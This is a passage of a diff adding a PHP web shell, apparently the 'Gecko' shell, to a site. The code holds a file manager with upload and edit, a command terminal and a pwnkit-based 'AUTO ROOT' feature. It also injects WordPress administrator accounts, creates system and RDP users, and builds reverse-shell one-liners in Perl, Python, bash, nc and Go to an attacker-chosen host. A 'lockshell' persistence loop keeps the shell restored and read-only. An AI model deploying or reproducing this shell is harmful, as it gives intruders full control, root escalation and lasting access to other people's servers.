+            background-color: rgba(0, 0, 0, .3)
+        }
+
+        .modal-container {
+            animation-name: modal-pop-out;
+            animation-duration: .7s;
+            animation-fill-mode: both;
+            margin: 10% auto auto;
+            border-radius: 10px;
+            width: 800px;
+            background-color: #f4f4f9
+        }
+
+        @keyframes modal-pop-out {
+            from {
+                opacity: 0
+            }
+
+            to {
+                opacity: 1
+            }
+        }
+
+        .modal-header {
+            color: #000;
+            margin-left: 30px;
+            padding: 10px
+        }
+
+        .modal-body,
+        .terminal-head li {
+            color: #000
+        }
+
+        .modal-create-input {
+            width: 700px;
+            padding: 10px 5px;
+            background-color: #f4f4f9;
+            margin: 0 5%;
+            border: none;
+            border-radius: 4px;
+            box-shadow: 8px 8px 20px rgba(0, 0, 0, .2);
+            border-bottom: 2px solid #0e0f17
+        }
+
+        .box-shadow {
+            box-shadow: 8px 8px 8px rgba(0, 0, 0, .2)
+        }
+
+        .btn-modal-close {
+            background-color: #22242d;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 35px
+        }
+
+        .badge-action-chmod:hover::after,
+        .badge-action-download:hover::after,
+        .badge-action-editor:hover::after {
+            padding: 5px;
+            border-radius: 5px;
+            margin-left: 110px;
+            background-color: #2e313d
+        }
+
+        .modal-btn-form {
+            margin: 15px 0;
+            padding: 10px;
+            text-align: right
+        }
+
+        .file-size {
+            color: orange
+        }
+
+        .badge-root::after {
+            content: "root";
+            display: block;
+            position: absolute;
+            width: 40px;
+            text-align: center;
+            margin-top: -30px;
+            margin-left: 110px;
+            border-radius: 4px;
+            background-color: red
+        }
+
+        .badge-premium::after {
+            content: "soon!";
+            display: block;
+            position: absolute;
+            width: 40px;
+            text-align: center;
+            margin-top: -30px;
+            margin-left: 140px;
+            border-radius: 4px;
+            background-color: red
+        }
+
+        .badge-action-chmod:hover::after,
+        .badge-action-download:hover::after,
+        .badge-action-editor:hover::after,
+        .badge-linux::after,
+        .badge-windows::after {
+            width: 60px;
+            text-align: center;
+            margin-top: -30px;
+            display: block;
+            position: absolute
+        }
+
+        .badge-windows::after {
+            background-color: orange;
+            color: #000;
+            margin-left: 100px;
+            border-radius: 4px;
+            content: "windows"
+        }
+
+        .badge-linux::after {
+            margin-left: 100px;
+            border-radius: 4px;
+            background-color: #0047a3;
+            content: "linux"
+        }
+
+        .badge-action-editor:hover::after {
+            content: "Rename"
+        }
+
+        .badge-action-chmod:hover::after {
+            content: "Chmod"
+        }
+
+        .badge-action-download:hover::after {
+            content: "Download"
+        }
+
+        .CodeMirror {
+            height: 70vh;
+        }
+
+        .code-editor,
+        .terminal {
+            background-color: rgba(0, 0, 0, .3);
+            width: 100%
+        }
+
+        .code-editor-container {
+            background-color: #f4f4f9;
+            color: #000;
+            width: 90%;
+            height: 90vh;
+            margin: 20px auto auto;
+            border-radius: 10px
+        }
+
+        .code-editor-head {
+            padding: 15px;
+            font-weight: 700
+        }
+
+        .terminal-container {
+            animation: .5s both modal-pop-out;
+            width: 90%;
+            background-color: #f4f4f9;
+            margin: 25px auto auto;
+            color: #000;
+            border-radius: 4px
+        }
+
+        .bc-gecko,
+        .mail,
+        .terminal-input {
+            background-color: #22242d;
+            color: #fff
+        }
+
+        .terminal-head {
+            padding: 8px
+        }
+
+        .terminal-head li a {
+            color: #000;
+            position: absolute;
+            right: 0;
+            margin-right: 110px;
+            font-weight: 700;
+            margin-top: -20px;
+            font-size: 25px;
+            padding: 1px 10px
+        }
+
+        .terminal-body textarea {
+            margin: 4px;
+            background-color: #22242d;
+            color: #29db12;
+            border-radius: 4px
+        }
+
+        .active {
+            display: block
+        }
+
+        .terminal-input {
+            width: 500px;
+            padding: 6px;
+            border: 1px solid #22242d;
+            border-radius: 4px;
+            margin: 5px 0
+        }
+
+        .bc-gecko {
+            border: none;
+            padding: 7px 10px;
+            width: 712px;
+            border-radius: 5px;
+            margin: 15px 40px
+        }
+
+        .mail {
+            width: 705px;
+            resize: none;
+            height: 100px
+        }
+
+        .logo-gecko {
+            position: absolute;
+            top: -90px;
+            right: 40px;
+            z-index: -1;
+            bottom: 0
+        }
+    </style>
+</head>
+
+<body>
+    <div class="menu-header">
+        <ul>
+            <li><i class="fa-solid fa-computer"></i>&nbsp;<?= $fungsi[8](); ?></li>
+            <li><i class="fa-solid fa-server"></i>&nbsp;<?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?></li>
+            <li><i class="fa-solid fa-network-wired"></i>&nbsp;: <?= gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]); ?> |&nbsp;: <?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?></li>
+            <li><i class="fa-solid fa-globe"></i>&nbsp;<?= s(); ?></li>
+            <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
+            <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
+            <li class="logo-gecko"><img width="300" height="300" src="https://xcdnbcd.b-cdn.net/darkjungz.webp" align="right"></li>
+            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
+                <li class="form-upload"><input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;<input type="file" name="gecko-upload" class="form-file"></li>
+            </form>
+        </ul>
+    </div>
+    <div class="menu-tools">
+        <ul>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn-submit"><i class="fa-solid fa-terminal"></i> Terminal</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit badge-root"><i class="fa-solid fa-user-lock"></i> AUTO ROOT</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit"><i class="fa-solid fa-database"></i> Adminer</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit"><i class="fa-solid fa-ghost"></i> Backdoor Destroyer</a></li>
+            <li><a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="btn-submit"><i class="fa-solid fa-flask"></i> Linux Exploit</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit"><i class="fa-brands fa-linux"></i> Lock Shell</a></li>
+            <li><a href="" class="btn-submit badge-linux" id="lock-file"><i class="fa-brands fa-linux"></i> Lock File</a></li>
+            <li><a href="" class="btn-submit badge-root" id="root-user"><i class="fa-solid fa-user-plus"></i> Create User</a></li>
+            <li><a href="" class="btn-submit" id="create-rdp"><i class="fa-solid fa-laptop-file"></i> CREATE RDP</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&mailer" class="btn-submit"><i class="fa-solid fa-envelope"></i> PHP Mailer</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn-submit"><i class="fa-solid fa-user-secret"></i> BACKCONNECT</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&unlockshell" class="btn-submit"><i class="fa-solid fa-unlock-keyhole"></i> UNLOCK SHELL</a></li>
+            <li><a href="//hashes.com/en/tools/hash_identifier" class="btn-submit"><i class="fa-solid fa-code"></i> HASH IDENTIFIER</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&cpanelreset" class="btn-submit"><i class="fa-brands fa-cpanel"></i> CPANEL RESET</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="btn-submit"><i class="fa-brands fa-wordpress-simple"></i> CREATE WP USER</a></li>
+            <li><a href="//github.com/MadExploits/" class="btn-submit"><i class="fa-solid fa-link"></i>&nbsp;README</a></li>
+        </ul>
+    </div>
+
+    <?php
+
+    $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
+    $get_cwd = $fungsi[0]();
+    ?>
+
+    <div class="menu-file-manager">
+        <ul>
+            <li><a href="" id="create_folder">+ Create Folder</a></li>
+            <li><a href="" id="create_file">+ Create File</a></li>
+        </ul>
+        <div class="path-pwd">
+            <?php
+            $cwd = str_replace("\\", "/", $get_cwd); // untuk dir garis windows
+            $pwd = explode("/", $cwd);
+            if (stristr(PHP_OS, "WIN")) {
+                windowsDriver();
+            }
+            foreach ($pwd as $id => $val) {
+                if ($val == '' && $id == 0) {
+                    echo '&nbsp;<a href="?d=' . hx('/') . '"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a>';
+                    continue;
+                }
+                if ($val == '') continue;
+                echo '<a href="?d=';
+                for ($i = 0; $i <= $id; $i++) {
+                    echo hx($pwd[$i]);
+                    if ($i != $id) echo hx("/");
+                }
+                echo '">' . $val . ' / ' . '</a>';
+            }
+            echo "<a style='font-weight:bold; color:orange;' href='?d=" . hx(__DIR__) . "'>[ HOME SHELL ]</a>&nbsp;";
+            ?>
+        </div>
+        </ul>
+        <table style="width: 100%;">
+            <thead>
+                <tr>
+                    <th>Name</th>
+                    <th>Size</th>
+                    <th>Permission</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <form action="" method="post">
+                <tbody>
+                    <!-- Gecko Folder File Manager -->
+                    <?php foreach ($file_manager as $_D) : ?>
+                        <?php if ($fungsi[2]($_D)) : ?>
+                            <tr>
+                                <td><input type="checkbox" name="check[]" value="<?= $_D ?>">&nbsp;<i class="fa-solid fa-folder-open" style="color:orange;"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a></td>
+                                <td>[ DIR ]</td>
+                                <td>
+                                    <?php if ($fungsi[4]($fungsi[0]() . '/' . $_D)) {
+                                        echo '<font color="#00ff00">';
+                                    } elseif (!$fungsi[5]($fungsi[0]() . '/' . $_D)) {
+                                        echo '<font color="red">';
+                                    }
+                                    echo perms($fungsi[0]() . '/' . $_D);
+                                    ?>
+                                </td>
+                                <!-- Action Folder Manager -->
+                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a></td>
+                            </tr>
+                        <?php endif; ?>
+                    <?php endforeach; ?>
+                    <!-- Gecko Files Manager -->
+                    <?php foreach ($file_manager as $_F) : ?>
+                        <?php if ($fungsi[3]($_F)) : ?>
+                            <tr>
+                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="gecko-files"><?= namaPanjang($_F); ?></a></td>
+                                <td><?= formatSize(filesize($_F)); ?></td>
+                                <td>
+                                    <?php if (is_writable($fungsi[0]() . '/' . $_D)) {
+                                        echo '<font color="#00ff00">';
+                                    } elseif (!is_readable($fungsi[0]() . '/' . $_F)) {
+                                        echo '<font color="red">';
+                                    }
+                                    echo perms($fungsi[0]() . '/' . $_F);
+                                    ?>
+                                </td>
+                                <!-- Action File Manager -->
+                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
+                            </tr>
+                        <?php endif; ?>
+                    <?php endforeach; ?>
+                </tbody>
+        </table>
+        <br>
+        <select name="gecko-select" class="btn-submit">
+            <option value="delete">Delete</option>
+            <option value="unzip">Unzip</option>
+            <option value="zip">Zip</option><br>
+        </select>
+        <input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 8.3px 35px;">
+        </form>
+
+        <!-- Modal Pop Jquery Create Folder/File By ./MrMad -->
+        <div class="modal">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">${this.title}</i></b></h3>
+                </div>
+                <form action="" method="post">
+                    <div class="modal-body">
+                        <div id="modal-body-bc"></div>
+                        <span id="modal-input"></span>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow" id="close-modal">Close</button>
+                        </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    </div>
+    <?php if (isset($_GET['cpanelreset'])) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">:: Cpanel Reset </i></b></h3>
+                </div>
+                <form action="" method="post">
+                    <div class="modal-body">
+                        <div class="modal-isi">
+                            <form action="" method="post">
+                                <input type="email" name="resetcp" class="modal-create-input" placeholder="Your email : example@mail.com">
+                        </div>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
+                        </div>
+                </form>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if (isset($_GET['createwp'])) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">
+                                <center>CREATE WORDPRESS ADMIN PASSWORD</center>
+                            </i></b></h3>
+                </div>
+                <form action="" method="post">
+                    <div class="modal-body">
+                        <div class="modal-isi">
+                            <form action="" method="post">
+                                <input type="text" name="db_name" class="modal-create-input" placeholder="DB_NAME">
+                                <br><br>
+                                <input type="text" name="db_user" class="modal-create-input" placeholder="DB_USER">
+                                <br><br>
+                                <input type="text" name="db_password" class="modal-create-input" placeholder="DB_PASSWORD">
+                                <br><br>
+                                <input type="text" name="db_host" class="modal-create-input" placeholder="DB_HOST" value="127.0.0.1">
+                                <br><br>
+                                <hr size="2" color="black" style="margin:0px 30px; border-radius:3px;">
+                                <br><br>
+                                <input type="text" name="wp_user" class="modal-create-input" placeholder="Your Username">
+                                <br><br>
+                                <input type="text" name="wp_pass" class="modal-create-input" placeholder="Your Password">
+                                <br><br>
+                        </div>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submitwp" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
+                        </div>
+                </form>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if (isset($_GET['backconnect'])) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">:: Backconnect</i></b></h3>
+                </div>
+                <form action="" method="post">
+                    <div class="modal-body">
+                        <select class="bc-gecko box-shadow" name="gecko-bc">
+                            <option value="-">Choose Backconnect</option>
+                            <option value="perl">Perl</option>
+                            <option value="python">Python</option>
+                            <option value="ruby">Ruby</option>
+                            <option value="bash">Bash</option>
+                            <option value="php">php</option>
+                            <option value="nc">nc</option>
+                            <option value="sh">sh</option>
+                            <option value="xterm">Xterm</option>
+                            <option value="golang">Golang</option>
+                        </select>
+                        <input type="text" name="backconnect-host" class="modal-create-input" placeholder="127.0.0.1">
+                        <br><br>
+                        <input type="number" name="backconnect-port" class="modal-create-input" placeholder="1337">
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit-bc" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
+                        </div>
+                </form>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if (isset($_GET['mailer'])) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">:: PHP Mailer</i></b></h3>
+                </div>
+                <form action="" method="post">
+                    <div class="modal-body">
+                        <div class="modal-isi">
+                            <form action="" method="post">
+                                <div class="modal-mail-text">
+                                    <textarea name="message-smtp" class="box-shadow mail" placeholder="&nbsp;Your Text here!"></textarea>
+                                </div>
+                                <br>
+                                <input type="text" name="mailto-subject" class="modal-create-input" placeholder="Subject">
+                                <br><br>
+                                <input type="email" name="mail-from-smtp" class="modal-create-input" placeholder="from : example@mail.com">
+                                <br><br>
+                                <input type="email" name="mail-to-smtp" class="modal-create-input" placeholder="to : example@mail.com">
+                        </div>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
+                        </div>
+                </form>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['f']) : ?>
+        <div class="code-editor">
+            <div class="code-editor-container">
+                <div class="code-editor-head">
+                    <h3><i class="fa-solid fa-code"></i>&nbsp; Code Editor : <?= unx($_GET['f']); ?></h3>
+                </div>
+                <div class="code-editor-body">
+                    <form action="" method="post">
+                        <textarea name="code-editor" id="code" class="box-shadow" autofocus><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))); ?></textarea>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="save-editor" value="Save" class="btn-modal-close">&nbsp;<button class="btn-modal-close" id="close-editor">Close</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['terminal'] == "normal") : ?>
+        <div class="terminal">
+            <div class="terminal-container">
+                <div class="terminal-head">
+                    <ul>
+                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;TERMINAL</b></li>
+                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
+                    </ul>
+                </div>
+                <div class="terminal-body">
+                    <textarea class="box-shadow" disabled><?php
+                                                            if (isset($_POST['terminal'])) {
+                                                                echo $fungsi[10](cmd($_POST['terminal-text'] . " 2>&1"));
+                                                            }
+                                                            ?></textarea>
+                    <form action="" method="post">
+                        <ul>
+                            <li><input type="text" name="terminal-text" class="terminal-input box-shadow" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
+                            <li><input type="submit" name="terminal" value=">" class="btn-modal-close"></li>
+                        </ul>
+                    </form>
+                </div>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['terminal'] == "root") : ?>
+        <div class="terminal">
+            <div class="terminal-container">
+                <div class="terminal-head">
+                    <ul>
+                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;AUTO ROOT</b></li>
+                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
+                    </ul>
+                </div>
+                <div class="terminal-body">
+                    <textarea name="" disabled><?php if ($fungsi[3]('.mad-root') && $fungsi[3]('pwnkit')) {
+                                                    $response = $fungsi[11]('.mad-root');
+                                                    $r_text = explode(" ", $response);
+                                                    if ($r_text[0] == "uid=0(root)") {
+                                                        if (isset($_POST['submit-root'])) {
+                                                            echo cmd('./pwnkit "' . $_POST['root-terminal'] . '  2>&1"');
+                                                        }
+                                                    } else {
+                                                        echo "This Device Is Not Vulnerable\n";
+                                                        echo cmd('cat /etc/os-release') . "\n";
+                                                        echo "Kernel Version : " . suggest_exploit() . "\n";
+                                                    }
+                                                } else {
+                                                    $fungsi[24]('.mad-root');
+                                                } ?></textarea>
+                    <form action="" method="post">
+                        <ul>
+                            <li><input type="text" name="root-terminal" class="terminal-input" placeholder="<?= "root" . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
+                            <li><input type="submit" name="submit-root" value=">" class="btn-modal-close"></li>
+                        </ul>
+                    </form>
+                </div>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['re'] == true) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">Rename : <?= unx($_GET['re']) ?></i></b></h3>
+                </div>
+                <div class="modal-body">
+                    <form action="" method="post">
+                        <span id="modal-input"><input type="text" name="renameFile" class="modal-create-input" placeholder="Rename"></span>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['ch'] == true) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">Change Permission : <?= unx($_GET['ch']) ?></i></b></h3>
+                </div>
+                <div class="modal-body">
+                    <form action="" method="post">
+                        <span id="modal-input"><input type="number" name="chFile" class="modal-create-input" placeholder="0775"></span>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        </div>
+    <?php endif; ?>
+    <script>
+        $(document).ready(function() {
+
+
+            $('#create_folder').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder');
+                $('#modal-input').html('<input type="text" name="create_folder" class="modal-create-input" placeholder="Create Folder">');
+                event.preventDefault();
+            });
+            $('#create_file').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File');
+                $('#modal-input').html('<input type="text" name="create_file" class="modal-create-input" placeholder="Create File">');
+                event.preventDefault();
+            });
+            $('#lock-file').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-lock"></i>&nbsp;LOCK FILE');
+                $('#modal-input').html('<input type="text" name="lockfile" class="modal-create-input" placeholder="Your File Name">');
+                event.preventDefault();
+            });
+            $('#root-user').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-user-plus"></i>&nbsp;ADD USER');
+                $('#modal-input').html('<input type="text" name="add-username" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-password" class="modal-create-input" placeholder="Password">');
+                event.preventDefault();
+            });
+
+            $('#create-rdp').click(function() {
+                $('.modal').show();
+                $('#modal-title').html(':: CREATE RDP');
+                $('#modal-input').html('<input type="text" name="add-rdp" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-rdp-pass" class="modal-create-input" placeholder="Password">');
+                event.preventDefault();
+            });
+
+            $('#close-modal').click(function() {
+                $('.modal').hide();
+                event.preventDefault();
+            });
+            $('#close-editor').click(function() {
+                $('.code-editor').hide();
+                event.preventDefault();
+            });
+
+            $('.close-terminal').click(function() {
+                $('.terminal').hide();
+                event.preventDefault();
+            });
+            $('.close-btn-s').click(function() {
+                $('.modal').hide();
+                event.preventDefault();
+            });
+
+
+            var myTextarea = document.getElementById("code");
+
+            var editor = CodeMirror.fromTextArea(myTextarea, {
+                mode: "xml",
+                lineNumbers: true,
+                theme: "ayu-mirage",
+                extraKeys: {
+                    "Ctrl-Space": "autocomplete"
+                },
+                hintOptions: {
+                    completeSingle: false,
+                },
+            });
+
+        });
+    </script>
+</body>
+
+</html>
+<?php
+
+if (isset($_POST['submitwp'])) {
+    $db_name = $_POST['db_name'];
+    $db_user = $_POST['db_user'];
+    $db_pass = $_POST['db_pass'];
+    $db_host = $_POST['db_host'];
+    $wp_user = $_POST['wp_user'];
+    $wp_pass = password_hash($_POST['wp_pass'], PASSWORD_DEFAULT);
+
+    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
+
+    if ($conn->connect_error) {
+        failed();
+        die("Error Cug : " . $conn->connect_error);
+    }
+
+    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'MadExploits', '', '', NOW(), '', 0, 'MadExploits')";
+
+    $sqltakeuserid = "SELECT ID FROM wp_users WHERE user_login = '$wp_user'";
+
+    if ($conn->query($sql) === TRUE && $conn->query($sqltakeuserid)) {
+        $result = $conn->query($sqltakeuserid);
+
+        if ($result->num_rows > 0) {
+            $row = $result->fetch_assoc();
+            $user_id = $row["ID"];
+
+            $sqlusermeta = "INSERT INTO wp_usermeta (umeta_id, user_id, meta_key, meta_value) VALUES ('', $user_id, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')";
+
+            if ($conn->query($sqlusermeta) === TRUE) {
+                Success();
+            } else {
+                echo "Error: " . $sqlusermeta . "\n" . $conn->error;
+            }
+        } else {
+            echo "User tidak ditemukan.\n";
+        }
+
+        Success();
+    } else {
+        echo "Error: " . $sql . "\n" . $conn->error;
+    }
+
+    $conn->close();
+}
+
+
+
+if (isset($_GET['unlockshell'])) {
+    if (cmd("killall -9 php") && cmd("pkill -9 php")) {
+        success();
+    } else {
+        failed();
+    }
+}
+
+if (isset($_POST['submit-bc'])) {
+    $HostServer = $_POST['backconnect-host'];
+    $PortServer = $_POST['backconnect-port'];
+    if ($_POST['gecko-bc'] == "perl") {
+        echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");' . $fungsi[16] . '("/bin/sh -i");};\'');
+    } else if ($_POST['gecko-bc'] == "python") {
+        echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
+    } else if ($_POST['gecko-bc'] == "ruby") {
+        echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;' . $fungsi[16] . ' sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
+    } else if ($_POST['gecko-bc'] == "bash") {
+        echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
+    } else if ($_POST['gecko-bc'] == "php") {
+        echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');' . $fungsi[16] . '("/bin/sh -i <&3 >&3 2>&3");\'');
+    } else if ($_POST['gecko-bc'] == "nc") {
+        echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
+    } else if ($_POST['gecko-bc'] == "sh") {
+        echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
+    } else if ($_POST['gecko-bc'] == "xterm") {
+        echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
+    } else if ($_POST['gecko-bc'] == "golang") {
+        echo cmd('echo \'package main;import"os/' . $fungsi[16] . '";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
+    }
+}
+
+
+
+if (isset($_GET['lockshell'])) {
+    $curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
+    $TmpNames = $fungsi[31]();
+    if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler')) && file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'))) {
+        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
+        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-handler'));
+    }
+    mkdir($TmpNames . "/.sessions");
+    cmd("cp $curFile " . $TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
+    chmod($curFile, 0444);
+    $handler = '
+<?php
+@ini_set("max_execution_time", 0);
+while (True){
+    if (!file_exists("' . __DIR__ . '")){
+        mkdir("' . __DIR__ . '");
+    }
+    if (!file_exists("' . $fungsi[0]() . '/' . $curFile . '")){
+        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text') . '"));
+        file_put_contents("' . $fungsi[0]() . '/' . $curFile . '", ' . $fungsi[32] . '($text));
+    }
+    if (gecko_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
+        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
+    }
+    if (gecko_perm("' . __DIR__ . '") != 0555){
+        chmod("' . __DIR__ . '", 0555);
+    }
+}
+
+function gecko_perm($flename){
+    return substr(sprintf("%o", fileperms($flename)), -4);
+}
+';
+    $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler') . "", $handler);
+    if ($hndlers) {
+        cmd(PHP_BINARY . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler') . ' > /dev/null 2>/dev/null &');
+        success();
+    } else {
+        failed();
+    }
+}
+if (isset($_POST['gecko-up-submit'])) {
